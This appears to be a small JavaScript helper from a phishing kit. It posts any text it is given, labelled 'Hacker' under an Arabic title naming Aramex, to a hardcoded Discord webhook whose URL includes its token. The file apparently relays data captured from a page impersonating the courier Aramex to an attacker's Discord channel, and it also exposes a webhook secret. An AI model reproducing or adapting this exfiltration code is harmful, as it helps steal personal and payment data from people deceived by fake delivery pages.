import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322961601246269440/BV6UVkw7sFDHwmWlu8gD_ANFaClw0bEbOljgPpveF9FpHosgQieJ17ToYJBfaRnWI3hv",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
